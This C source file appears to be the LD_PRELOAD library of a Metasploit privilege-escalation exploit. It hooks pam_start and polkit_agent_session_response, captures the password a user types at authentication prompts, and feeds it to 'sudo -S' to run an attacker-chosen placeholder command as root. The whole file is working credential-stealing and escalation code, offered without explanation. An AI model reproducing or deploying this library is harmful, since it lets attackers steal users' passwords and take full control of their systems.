#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <unistd.h>

void run_sudo(char* password){
  // Use a placeholder so that this library doesn't need to be recompiled every 
  // time the exploit is executed (which would be hard to do since Metasploit 
  // supports Windows and Mac OS as well.
  FILE* sudo = popen("sudo -S COMMAND_PLACEHOLDER_HERE____________________________________________________________________________________________________","w");
  fprintf(sudo,"%s\n",password);
  pclose(sudo);
}

int my_conv(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr){
  struct pam_conv *orig_pam_conversation = (struct pam_conv *)appdata_ptr;
  int i;
  int passwd_index = -1;
  for(i=0;i<num_msg;i++){
    if(strstr(msg[i]->msg,"Password") >= 0){
      passwd_index = i;
    }
  }
  int result = orig_pam_conversation->conv(num_msg,msg,resp,orig_pam_conversation->appdata_ptr);
  if(passwd_index >= 0){
    run_sudo(resp[passwd_index]->resp);
  }
  return result;
}

int pam_start(const char *service_name, const char *user, const struct pam_conv *pam_conversation, pam_handle_t **pamh){
  static int (*orig_pam_start)(const char *service_name, const char *user, const struct pam_conv *pam_conversation, pam_handle_t **pamh);
  if(!orig_pam_start){
    orig_pam_start = dlsym(RTLD_NEXT,"pam_start");
  }
  struct pam_conv *my_pam_conversation = malloc(sizeof(struct pam_conv));
  my_pam_conversation->conv = &my_conv;
  my_pam_conversation->appdata_ptr = (struct pam_conv *)pam_conversation;
  return orig_pam_start(service_name, user, my_pam_conversation, pamh);
}

void polkit_agent_session_response (void *session, char *response){
  static void *(*orig_polkit_agent_session_response)(void *session, char* response);
  if(!orig_polkit_agent_session_response){
    orig_polkit_agent_session_response = dlsym(RTLD_NEXT,"polkit_agent_session_response");
  }
  run_sudo(response);
  orig_polkit_agent_session_response(session,response);
  return;
}
